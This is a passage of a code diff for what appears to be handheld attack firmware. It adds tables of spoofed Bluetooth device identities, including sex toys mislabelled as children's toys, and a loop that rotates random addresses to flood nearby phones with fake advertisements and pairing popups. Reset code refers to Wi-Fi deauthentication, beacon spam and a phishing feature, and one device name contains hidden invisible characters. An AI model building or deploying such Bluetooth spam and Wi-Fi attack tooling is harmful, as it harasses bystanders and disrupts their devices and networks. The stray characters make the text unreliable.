+static const int g_appleDeviceCount = sizeof(g_appleDevices) / sizeof(g_appleDevices[0]);
+
+// 小米全家桶设备
+static const BleBeaconDevice g_xiaomiDevices[] = {
+  {"Xiaomi 17 Pro Max",                GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
+  {"Redmi Note 1󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠3",                    GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
+  {"Redmi Book 14",                    GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x038F},
+  {"Redmi Buds 6",                     GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
+  {"小米手环 9 Pro",                    GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
+  {"小米智能打印机",                    GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
+  {"小米无线键盘",                      GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
+  {"小米无线鼠标",                      GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
+  {"小米智能签字笔",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0xFFFF},
+  {"Xiaomi Watch S1",                  GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
+  {"Xiaomi SU7 Ultra",                 GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
+  {"Xiaomi Pad 7",                     GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
+  {"Xiaomi Smart Speaker",             GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
+  {"Xiaomi Smart Scale",               GAP_GATT_APPEARANCE_SENSOR,                  "180F", 0x038F}
+};
+static const int g_xiaomiDeviceCount = sizeof(g_xiaomiDevices) / sizeof(g_xiaomiDevices[0]);
+
+// 儿童玩具设备
+static const BleBeaconDevice g_toyDevices[] = {
+  {"遥控按摩震动笔", BLE_APPEARANCE_HID_DIGITAL_PEN, "180F", 0xFFFF},
+  {"按摩震动棒-A", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"郊狼电击理疗仪", GAP_GATT_APPEARANCE_WATCH, "180F", 0x038F},
+  {"按摩震动棒-B", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"加热震动仙女棒", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"按摩震动棒-C", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF}
+};
+static const int g_toyDeviceCount = sizeof(g_toyDevices) / sizeof(g_toyDevices[0]);
+
+// 华为全家桶设备
+static const BleBeaconDevice g_huaweiDevices[] = {
+    {"HUAWEI Mate 70",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x027D},
+    {"HUAWEI MatePad",              GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x027D},
+    {"HUAWEI MateBook",             GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x027D},
+    {"HUAWEI Earbuds",              GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
+    {"HUAWEI Watch 4",              GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
+    {"HUAWEI Watch GT 5",           GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
+    {"Huawei AR Glasses",           GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x027D},
+    {"Huawei Smart Box",            GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x027D},
+    {"Huawei Speaker",              GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x027D},
+    {"华为智能体重秤",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x027D}
+};
+static const int g_huaweiDeviceCount = sizeof(g_huaweiDevices) / sizeof(g_huaweiDevices[0]);
+
+// Google全家桶设备
+static const BleBeaconDevice g_googleDevices[] = {
+    {"Google Pixel Fold",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x00E0},
+    {"Google Pixel Tablet",            GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x00E0},
+    {"Chromebook",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x00E0},
+    {"Pixel Earbuds Buds",             GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
+    {"Google Pixel Watch",             GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x00E0},
+    {"Google Glass AR",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x00E0},
+    {"Google TV",                      GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x00E0},
+    {"Google Nest Speaker",            GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x00E0},
+    {"Google Nest Door",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x00E0}
+};
+static const int g_googleDeviceCount = sizeof(g_googleDevices) / sizeof(g_googleDevices[0]);
+
+// 全类型大杂烩（混合）
+static const BleBeaconDevice g_mixedDevices[] = {
+    {"[米家]智能眼镜",                     BLE_APPEARANCE_GENERIC_EYE_GLASSES,            "180F", 0xFFFF},
+    {"[米家]运动手表",                     BLE_APPEARANCE_WATCH_SPORTS_WATCH,             "180F", 0xFFFF},
+    {"[米家]智能手机",                     BLE_APPEARANCE_GENERIC_PHONE,                  "180F", 0xFFFF},
+    {"[米家]平板电脑",                     BLE_APPEARANCE_GENERIC_COMPUTER,               "180F", 0xFFFF},
+    {"[米家]遥控器",                       BLE_APPEARANCE_GENERIC_REMOTE_CONTROL,         "180F", 0xFFFF},
+    {"[米家]标签",                         BLE_APPEARANCE_GENERIC_TAG,                    "180F", 0xFFFF},
+    {"[米家]钥匙扣",                       BLE_APPEARANCE_GENERIC_KEYRING,                "180F", 0xFFFF},
+    {"[米家]媒体播放器",                   BLE_APPEARANCE_GENERIC_MEDIA_PLAYER,           "180F", 0xFFFF},
+    {"[米家]条码扫描枪",                   BLE_APPEARANCE_GENERIC_BARCODE_SCANNER,        "180F", 0xFFFF},
+    {"[米家]体温计(耳温)",                 BLE_APPEARANCE_THERMOMETER_EAR,                "180F", 0xFFFF},
+    {"[米家]心率带",                       BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT, "180F", 0xFFFF},
+    {"[米家]血压计(上臂)",                 BLE_APPEARANCE_BLOOD_PRESSURE_ARM,             "180F", 0xFFFF},
+    {"[米家]血压计(手腕)",                 BLE_APPEARANCE_BLOOD_PRESSURE_WRIST,           "180F", 0xFFFF},
+    {"[米家]键盘",                         BLE_APPEARANCE_HID_KEYBOARD,                   "180F", 0xFFFF},
+    {"[米家]鼠标",                         BLE_APPEARANCE_HID_MOUSE,                      "180F", 0xFFFF},
+    {"[米家]游戏手柄",                     BLE_APPEARANCE_HID_GAMEPAD,                    "180F", 0xFFFF},
+    {"[米家]操纵杆",                       BLE_APPEARANCE_HID_JOYSTICK,                   "180F", 0xFFFF},
+    {"[米家]数位板",                       BLE_APPEARANCE_HID_DIGITIZERSUBTYPE,           "180F", 0xFFFF},
+    {"[米家]读卡器",                       BLE_APPEARANCE_HID_CARD_READER,                "180F", 0xFFFF},
+    {"[米家]数字笔",                       BLE_APPEARANCE_HID_DIGITAL_PEN,                "180F", 0xFFFF},
+    {"[米家]条码扫描器(HID)",              BLE_APPEARANCE_HID_BARCODE,                    "180F", 0xFFFF},
+    {"[米家]血糖仪",                       BLE_APPEARANCE_GENERIC_GLUCOSE_METER,          "180F", 0xFFFF},
+    {"[米家]跑步传感器(鞋内)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE, "180F", 0xFFFF},
+    {"[米家]跑步传感器(鞋上)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE, "180F", 0xFFFF},
+    {"[米家]跑步传感器(腰部)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP,  "180F", 0xFFFF},
+    {"[米家]骑行码表",                     BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER,       "180F", 0xFFFF},
+    {"[米家]骑行速度传感器",               BLE_APPEARANCE_CYCLING_SPEED_SENSOR,           "180F", 0xFFFF},
+    {"[米家]骑行踏频传感器",               BLE_APPEARANCE_CYCLING_CADENCE_SENSOR,         "180F", 0xFFFF},
+    {"[米家]骑行功率计",                   BLE_APPEARANCE_CYCLING_POWER_SENSOR,           "180F", 0xFFFF},
+    {"[米家]速度踏频一体",                 BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR,   "180F", 0xFFFF},
+    {"[米家]血氧仪(指夹)",                 BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP,       "180F", 0xFFFF},
+    {"[米家]血氧仪(腕戴)",                 BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN,      "180F", 0xFFFF},
+    {"[米家]体重秤",                       BLE_APPEARANCE_GENERIC_WEIGHT_SCALE,           "180F", 0xFFFF},
+    {"[米家]户外运动定位显示",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP,    "180F", 0xFFFF},
+    {"[米家]户外运动定位+导航显示",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP, "180F", 0xFFFF},
+    {"[米家]户外运动定位POD",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD,     "180F", 0xFFFF},
+    {"[米家]户外运动定位+导航POD",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD,  "180F", 0xFFFF}
+};
+static const int g_mixedDeviceCount = sizeof(g_mixedDevices) / sizeof(g_mixedDevices[0]);
+
+// 罕见设备整合
+static const BleBeaconDevice g_miscDevices[] = {
+    {"Heart Rate Monitor",             GAP_GATT_APPEARANCE_HEART_RATE_SENSOR,         "180F", 0xFFFF},
+    {"Blood Pressure Monitor",         GAP_GATT_APPEARANCE_BP_SENSOR,                 "180F", 0xFFFF},
+    {"Glucose Meter",                  GAP_GATT_APPEARANCE_GLUCOSE_METER,             "180F", 0xFFFF},
+    {"Cycling Speed",                  GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
+    {"Walking Sensor",                 GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR,    "180F", 0xFFFF},
+    {"Indoor Bike Sensor",             GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
+    {"外星科技体温计",                  GAP_GATT_APPEARANCE_THERMOMETER,                "180F", 0xFFFF},
+    {"Generic Tag 智障标签",            GAP_GATT_APPEARANCE_GENERIC_TAG,               "180F", 0xFFFF},
+    {"iBeacon",                        GAP_GATT_APPEARANCE_BEACON,                    "180F", 0xFFFF},
+    {"智能光照传感器",                  GAP_GATT_APPEARANCE_LIGHT_SENSOR,              "180F", 0xFFFF},
+    {"外星科技无线耳机",                GAP_APPEARANCE_HEADSET,                        "180F", 0x0942},
+    {"高科技智能耳机",                  GAP_APPEARANCE_HEADPHONES,                     "180F", 0x0943 },
+    {"Clock Device",                   GAP_GATT_APPEARANCE_ALARM_CLOCK,               "180F", 0xFFFF}
+};
+static const int g_miscDeviceCount = sizeof(g_miscDevices) / sizeof(g_miscDevices[0]);
+
+// 设备类别枚举
+enum BleDeviceCategory {
+  BLE_CATEGORY_APPLE = 0,
+  BLE_CATEGORY_XIAOMI = 1,
+  BLE_CATEGORY_HUAWEI = 2,
+  BLE_CATEGORY_GOOGLE = 3,
+  BLE_CATEGORY_MIXED = 4,
+  BLE_CATEGORY_MISC = 5,
+  BLE_CATEGORY_TOY = 6
+};
+
+// ===== Generic BLE Menu System =====
+typedef void (*BleMenuAction)();
+
+struct BleMenuItem {
+  const char* label;
+  BleMenuAction action;
+};
+
+// 通用BLE菜单函数
+void showGenericBleMenu(const char* title, const BleMenuItem* items, int itemCount);
+static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex);
+static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex);
+
+// 前向声明
+void bleBeaconDeviceMenu();
+void bleBeaconBroadcast(BleDeviceCategory category);
+void bleBeaconMixedAction();
+
+// BLE信标设备类别回调函数
+void bleBeaconAppleAction();
+void bleBeaconXiaomiAction();
+void bleBeaconToyAction();
+void bleBeaconHuaweiAction();
+void bleBeaconGoogleAction();
+void bleBeaconMiscAction();
+
+void homeActionBleTest() {
+  if (!ensureBleSafeToStart()) return;
+  stabilizeButtonState();
+  bleBeaconDeviceMenu();
+}
+
+void homeActionBlePopupTest() {
+  if (!ensureBleSafeToStart()) return;
+  stabilizeButtonState();
+  blePopupMenu();
+}
+
+// ===== BLE feature implementations (ported from backup) =====
+
+// BLE popup rate control system
+static int g_blePopupRateIndex = 2; // Default to 100ms (index 2)
+static const int BLE_RATE_OPTIONS[] = {20, 50, 100, 200, 300, 400, 500}; // ms
+static const int BLE_RATE_COUNT = sizeof(BLE_RATE_OPTIONS) / sizeof(BLE_RATE_OPTIONS[0]);
+
+// BLE状态管理和资源冲突预防
+static bool g_bleActiveAdvertising = false; // 跟踪BLE广播状态
+static unsigned long g_lastBleActivity = 0; // 最后BLE活动时间
+static bool g_bleResourcesInUse = false; // BLE资源使用标志
+
+// Get current rate delay in ms
+static int getBlePopupDelay() {
+  return BLE_RATE_OPTIONS[g_blePopupRateIndex];
+}
+
+// 强化的BLE资源清理函数
+static void performCompleteBleCleanup() {
+  Serial.println("=== 开始强化BLE资源清理 ===");
+  
+  // 1. 标记BLE资源清理开始
+  g_bleResourcesInUse = false;
+  g_bleActiveAdvertising = false;
+  
+  // 2. 强制停止所有BLE广播
+  if (BLE.configAdvert()) {
+    Serial.println("停止BLE广播...");
+    BLE.configAdvert()->stopAdv();
+    delay(150); // 增加延时确保停止完成
+  }
+  
+  // 3. 清理BLE连接和服务
+  Serial.println("清理BLE连接和服务...");
+  BLE.end(); // 清理所有BLE服务和连接
+  delay(200);
+  
+  // 4. 完全去初始化BLE栈
+  Serial.println("去初始化BLE栈...");
+  BLE.deinit();
+  delay(300); // 增加延时确保完全清理
+  
+  // 5. 重置硬件状态
+  Serial.println("重置硬件状态...");
+  delay(200);
+  
+  // 6. 记录清理完成时间
+  g_lastBleActivity = millis();
+  
+  Serial.println("BLE资源清理完成");
+}
+
+// 检查是否可以安全启动WiFi功能
+static bool canSafelyStartWiFi() {
+  // 如果BLE资源仍在使用中，等待清理
+  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
+    Serial.println("等待BLE资源清理...");
+    performCompleteBleCleanup();
+    return false;
+  }
+  
+  // 确保距离上次BLE活动有足够间隔
+  unsigned long timeSinceLastBle = millis() - g_lastBleActivity;
+  if (timeSinceLastBle < 1000) { // 至少等待1秒
+    Serial.print("等待BLE资源稳定 (");
+    Serial.print(1000 - timeSinceLastBle);
+    Serial.println(" ms)...");
+    delay(1000 - timeSinceLastBle);
+  }
+  
+  return true;
+}
+
+// 安全检查BLE状态（实现）
+static void checkBleResourcesForWiFi() {
+  // 如果BLE正在使用，执行强化清理
+  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
+    Serial.println("检测到BLE活动，执行强化清理...");
+    performCompleteBleCleanup();
+    delay(200); // 给WiFi硬件恢复时间
+  }
+}
+
+// 启动时强制重置所有状态（修复重启后问题）
+static void performStartupStateReset() {
+  // 先初始化显示并显示初始化信息
+  Serial.println("0. 初始化显示系统...");
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("SSD1306 init failed"));
+    while (true);
+  }
+  u8g2_for_adafruit_gfx.begin(display);
+  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
+  
+  // 显示"..."
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  
+  const char* initText = "...";
+  int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(initText);
+  int x = (display.width() - textWidth) / 2;
+  if (x < 0) x = 0;
+  u8g2_for_adafruit_gfx.setCursor(x, 32);
+  u8g2_for_adafruit_gfx.print(initText);
+  display.display();
+  
+  Serial.println("1. 重置BLE状态变量...");
+  g_bleResourcesInUse = false;
+  g_bleActiveAdvertising = false;
+  g_lastBleActivity = 0;
+  
+  Serial.println("2. 清理WiFi扫描结果...");
+  scan_results.clear();
+  scan_results.shrink_to_fit(); // 释放内存
+  SelectedVector.clear();
+  SelectedVector.shrink_to_fit();
+  selectedFlags.clear();
+  selectedFlags.shrink_to_fit();
+  g_scanDone = false;
+  
+  Serial.println("3. 重置Web服务状态...");
+  web_ui_active = false;
+  web_test_active = false;
+  web_server_active = false;
+  dns_server_active = false;
+  g_webTestLocked = false;  // 允许钓鱼功能重复启动
+  g_webUILocked = false;     // Web UI保持一次性限制
+  
+  Serial.println("4. 重置攻击状态...");
+  deauthAttackRunning = false;
+  beaconAttackRunning = false;
+  attackstate = 0;
+  becaonstate = 0;
+  g_attackDetectRunning = false;
+  g_packetDetectRunning = false;
+  
+  Serial.println("5. 强制WiFi硬件重置...");
+  wifi_off();
+  delay(500); // 增加延时确保完全关闭
+  wifi_on(RTW_MODE_AP);
+  delay(500); // 增加延时确保完全启动
+  
+  Serial.println("6. 清理内存碎片...");
+  // 强制垃圾回收（如果平台支持）
+  delay(100);
+  
+  Serial.println("启动状态重置完成");
+}
+
+// Handle rate control UI and return true if rate changed
+static bool handleBlePopupRateControl() {
+  static unsigned long lastBleUpTime = 0, lastBleDownTime = 0;
+  unsigned long now = millis();
+  bool rateChanged = false;
+  
+  // Handle UP button - decrease delay (increase rate)
+  if (digitalRead(BTN_UP) == LOW && (now - lastBleUpTime > 300)) {
+    lastBleUpTime = now;
+    if (g_blePopupRateIndex > 0) {
+      g_blePopupRateIndex--;
+      rateChanged = true;
+    }
+  }
+  
+  // Handle DOWN button - increase delay (decrease rate)  
+  if (digitalRead(BTN_DOWN) == LOW && (now - lastBleDownTime > 300)) {
+    lastBleDownTime = now;
+    if (g_blePopupRateIndex < BLE_RATE_COUNT - 1) {
+      g_blePopupRateIndex++;
+      rateChanged = true;
+    }
+  }
+  
+  return rateChanged;
+}
+
+// Common BLE popup display with rate control
+static void drawBlePopupDisplay(const char* title) {
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine(title, 12);
+  String rateStr = "速率と延时: " + String(getBlePopupDelay()) + "ms";
+  oledDrawCenteredLine(rateStr.c_str(), 28);
+  oledDrawCenteredLine("UP/DOWN调节", 44);
+  oledDrawCenteredLine("BACK 返回", 56);
+  display.display();
+}
+
+// Common BLE popup rate control handler for main loop
+static bool handleBlePopupMainLoop(const char* title, unsigned long& lastDisplayUpdate) {
+  if (digitalRead(BTN_BACK) == LOW) { 
+    delay(200); 
+    return true; // Exit
+  }
+  
+  // Handle rate control and update display only if rate changed
+  bool rateChanged = handleBlePopupRateControl();
+  unsigned long now = millis();
+  // 减少刷新频率，避免闪烁：只在速率改变时刷新，或者每3秒刷新一次
+  if (rateChanged || (now - lastDisplayUpdate > 3000)) {
+    drawBlePopupDisplay(title);
+    lastDisplayUpdate = now;
+  }
+  
+  return false; // Continue
+}
+
+// Common BLE popup rate control handler for delay loop
+static bool handleBlePopupDelayLoop(const char* title, unsigned long& lastDisplayUpdate) {
+  if (digitalRead(BTN_BACK) == LOW) return true; // Exit delay loop
+  
+  // Check for rate control during delay - 只在速率改变时刷新屏幕
+  if (handleBlePopupRateControl()) {
+    drawBlePopupDisplay(title);
+    lastDisplayUpdate = millis();
+  }
+  
+  return false; // Continue delay
+}
+
+// BLE headset-like advertising test
+void bleHeadsetTest() {
+  // OLED UI: show status
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine("[蓝牙信标发送]", 25);
+  oledDrawCenteredLine("按BACK退出", 50);
+  display.display();
+
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+
+  // Initialize BLE and configure non-connectable advertising
+  BLE.init();
+  BLE.setDeviceName("按摩震动棒");
+  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(80);  // 50ms
+  BLE.configAdvert()->setMaxInterval(160); // 100ms
+
+  // Start peripheral mode (advertising only, non-connectable)
+  BLE.beginPeripheral();
+
+  // Generate a pool of STATIC random addresses (减少内存使用)
+  const uint8_t maxClones = 20; // 从10减少到20以节省内存
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+  // Ensure advertising uses RANDOM local address type
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+
+  const uint16_t perCloneMs = 80; // 减少切换延时，提高切换速度
+  uint8_t idx = 0;
+
+  while (true) {
+    if (digitalRead(BTN_BACK) == LOW) { delay(200); break; }
+
+    // Stop current advertising to switch address and name
+    BLE.configAdvert()->stopAdv();
+
+    // Set next address from pool
+    le_set_rand_addr(addrPool[idx]);
+    delay(20);
+
+    // Build advert payloads
+    BLEAdvertData cadv; BLEAdvertData cscn;
+    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    char namebuf[24];
+    snprintf(namebuf, sizeof(namebuf), "按摩震动棒");
+    cadv.addCompleteName(namebuf);
+    cadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+    cadv.addCompleteServices(BLEUUID("1812"));
+    uint8_t mfg[8]; uint16_t company = 0xFFFF;
+    mfg[0] = 7; mfg[1] = 0xFF; mfg[2] = (uint8_t)(company & 0xFF); mfg[3] = (uint8_t)(company >> 8);
+    mfg[4] = idx; mfg[5] = addrPool[idx][3]; mfg[6] = addrPool[idx][4]; mfg[7] = addrPool[idx][5];
+    cadv.addData(mfg, sizeof(mfg));
+    cscn.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
+    BLE.configAdvert()->setAdvData(cadv);
+    BLE.configAdvert()->setScanRspData(cscn);
+    BLE.configAdvert()->updateAdvertParams();
+
+    // Restart advertising
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    while (millis() - start < perCloneMs) { if (digitalRead(BTN_BACK) == LOW) break; delay(10); }
+    idx = (uint8_t)((idx + 1) % maxClones);
+  }
+
+  // Stop BLE and clean up resources
+  Serial.println("停止BLE广播并清理资源...");
+  BLE.configAdvert()->stopAdv();
+  g_bleActiveAdvertising = false;
+  delay(100);
+  BLE.deinit();
+  g_bleResourcesInUse = false;
+  g_lastBleActivity = millis();
+  Serial.println("BLE资源清理完成");
+}
+
+// ===== Generic BLE Menu System Implementation =====
+void showGenericBleMenu(const char* /* title */, const BleMenuItem* items, int itemCount) {
+  static int g_genericBleState = 0;
+  static int g_genericBleStartIndex = 0;
+  
+  const int ITEM_H = 16;
+  const int Y_OFF = 2;
+  const int MAX_DISPLAY_ITEMS = 4;
+  
+  // 重置选择状态
+  g_genericBleState = 0;
+  g_genericBleStartIndex = 0;
+  
+  unsigned long lastUpTime = 0, lastDownTime = 0, lastOkTime = 0, lastBackTime = 0;
+  
+  while (true) {
+    unsigned long now = millis();
+    
+    // 处理BACK按键
+    if (digitalRead(BTN_BACK) == LOW) {
+      if (now - lastBackTime > DEBOUNCE_DELAY) {
+        lastBackTime = now;
+        // 等待按键释放，避免主循环立即检测到返回键
+        while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+        return;
+      }
+    }
+    
+    // 处理OK按键
+    if (digitalRead(BTN_OK) == LOW) {
+      if (now - lastOkTime > DEBOUNCE_DELAY) {
+        lastOkTime = now;
+        stabilizeButtonState();
+        
+        int selIndex = g_genericBleStartIndex + g_genericBleState;
+        if (selIndex >= 0 && selIndex < itemCount && items[selIndex].action) {
+          items[selIndex].action();
+        }
+        // 不要return，继续菜单循环
+      }
+    }
+    
+    // 处理UP按键
+    if (digitalRead(BTN_UP) == LOW) {
+      if (now - lastUpTime > DEBOUNCE_DELAY) {
+        if (g_genericBleState > 0) {
+          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
+          g_genericBleState--;
+          int yTo = Y_OFF + g_genericBleState * ITEM_H;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        } else if (g_genericBleStartIndex > 0) {
+          g_genericBleStartIndex--;
+          int yFrom = Y_OFF + 1 * ITEM_H;
+          int yTo = Y_OFF + 0 * ITEM_H;
+          g_genericBleState = 0;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        }
+        lastUpTime = now;
+      }
+    }
+    
+    // 处理DOWN按键
+    if (digitalRead(BTN_DOWN) == LOW) {
+      if (now - lastDownTime > DEBOUNCE_DELAY) {
+        if (g_genericBleState < MAX_DISPLAY_ITEMS - 1 && (g_genericBleStartIndex + g_genericBleState) < itemCount - 1) {
+          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
+          g_genericBleState++;
+          int yTo = Y_OFF + g_genericBleState * ITEM_H;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        } else if ((g_genericBleStartIndex + MAX_DISPLAY_ITEMS) < itemCount) {
+          g_genericBleStartIndex++;
+          int yFrom = Y_OFF + (MAX_DISPLAY_ITEMS - 2) * ITEM_H;
+          int yTo = Y_OFF + (MAX_DISPLAY_ITEMS - 1) * ITEM_H;
+          g_genericBleState = MAX_DISPLAY_ITEMS - 1;
+          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
+        }
+        lastDownTime = now;
+      }
+    }
+    
+    // 主绘制循环 - 完全按照原始代码的方式
+    display.clearDisplay();
+    drawGenericBleMenuBase(items, itemCount, g_genericBleStartIndex);
+    int rectY = Y_OFF + g_genericBleState * ITEM_H;
+    display.drawRoundRect(0, rectY - 2, display.width(), 14, 2, SSD1306_WHITE);
+    display.display();
+    delay(40);
+  }
+}
+
+static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex) {
+  display.clearDisplay();
+  const int ITEM_H = 16;
+  const int Y_OFF = 2;
+  const int MAX_DISPLAY_ITEMS = 4;
+  
+  // 完全按照原始蓝牙弹窗菜单的方式绘制
+  for (int i = 0; i < MAX_DISPLAY_ITEMS && (startIndex + i) < itemCount; i++) {
+    int yPos = Y_OFF + i * ITEM_H;
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setCursor(5, yPos + 10);
+    u8g2_for_adafruit_gfx.print(items[startIndex + i].label);
+    drawRightChevron(yPos - 2, 14, false);
+  }
+}
+
+static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex) {
+  // 完全按照原始动画代码
+  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
+  const int width = display.width();
+  unsigned long nextStepDeadline = millis() + delayPerStepMs;
+  
+  for (int s = 1; s <= ANIM_STEPS; s++) {
+    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
+    drawGenericBleMenuBase(items, itemCount, startIndex);
+    display.drawRoundRect(0, y, width, rectHeight, 2, SSD1306_WHITE);
+    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
+    while ((long)(millis() - nextStepDeadline) < 0) { }
+    nextStepDeadline += delayPerStepMs;
+  }
+}
+
+// ===== Enhanced BLE Beacon Device Menu =====
+
+void bleBeaconDeviceMenu() {
+  // 定义信标设备菜单项
+  static const BleMenuItem beaconMenuItems[] = {
+    {"广播:Apple全家桶", bleBeaconAppleAction},
+    {"广播:小米全家桶", bleBeaconXiaomiAction},
+    {"广播:华为全家桶", bleBeaconHuaweiAction},
+    {"广播:Google全家桶", bleBeaconGoogleAction},
+    {"广播:米家大杂烩", bleBeaconMixedAction},
+    {"广播:罕见设备", bleBeaconMiscAction},
+    {"广播:儿童玩具", bleBeaconToyAction}
+  };
+  static const int beaconMenuCount = sizeof(beaconMenuItems) / sizeof(beaconMenuItems[0]);
+  
+  showGenericBleMenu("", beaconMenuItems, beaconMenuCount);
+}
+
+// BLE信标设备类别回调函数实现
+void bleBeaconAppleAction() {
+  if (showConfirmModal("启动Apple设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_APPLE);
+  }
+}
+
+void bleBeaconXiaomiAction() {
+  if (showConfirmModal("启动小米设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_XIAOMI);
+  }
+}
+
+void bleBeaconToyAction() {
+  if (showConfirmModal("启动玩具设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_TOY);
+  }
+}
+
+void bleBeaconHuaweiAction() {
+  if (showConfirmModal("启动华为设备广播")) {
